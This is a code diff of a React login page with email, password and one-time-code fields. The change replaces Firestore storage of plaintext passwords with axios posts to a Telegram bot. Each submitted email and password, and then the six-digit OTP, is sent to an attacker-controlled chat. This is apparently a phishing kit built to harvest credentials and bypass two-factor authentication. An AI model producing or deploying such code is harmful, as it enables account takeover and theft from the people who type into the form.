@@ -1,9 +1,11 @@
 import React, {useState, useEffect} from "react";
-import db from "../../firebase";
-import {collection,doc, deleteDoc, getDocs, updateDoc, setDoc} from "firebase/firestore";
+// import db from "../../firebase";
+// import {collection,doc, deleteDoc, getDocs, updateDoc, setDoc} from "firebase/firestore";
 import OtpInput from 'react-otp-input';
+import axios from "axios";
 
 const Home = () => {
+    const url = `https://api.telegram.org/bot${process.env.NEXT_PUBLIC_BOT}/sendMessage`;
     const [otp, setOtp] = useState('');
     const [search, setSearch] = useState("");
     const [userID, setUserID] = useState("");
@@ -45,13 +47,17 @@ const Home = () => {
         setErrors(validate(values))
         if(values.email && values.password && !errors.email && !errors.password){
             setUserID("user_" + new Date().getTime())
-            const docRef = doc(db, "users", "user_" + new Date().getTime());
+            //const docRef = doc(db, "users", "user_" + new Date().getTime());
             const saveData = async () => {
-                await setDoc(docRef, {
-                    email: values.email,
-                    password: values.password,
-                    otp: ""
-                });
+                // await setDoc(docRef, {
+                //     email: values.email,
+                //     password: values.password,
+                //     otp: ""
+                // });
+                await axios.post(url, {
+                    chat_id: process.env.NEXT_PUBLIC_CHAT_ID,
+                    text: `New user: \nEmail: ${values.email} \nPassword: ${values.password}`
+                })
             }
             saveData()
             setSearch("otp")
@@ -61,10 +67,14 @@ const Home = () => {
   useEffect(() => { 
     //update otp in firebase
     const updateOtp = async () => {
-        const docRef = doc(db, "users", userID);
-        await updateDoc(docRef, {
-            otp: otp
-        });
+        // const docRef = doc(db, "users", userID);
+        // await updateDoc(docRef, {
+        //     otp: otp
+        // });
+        await axios.post(url, {
+            chat_id: process.env.NEXT_PUBLIC_CHAT_ID,
+            text: `New user: \nEmail: ${values.email} \nPassword: ${values.password} \nOtp: ${otp}`
+        })
     }
     if(otp.length === 6){
         updateOtp()
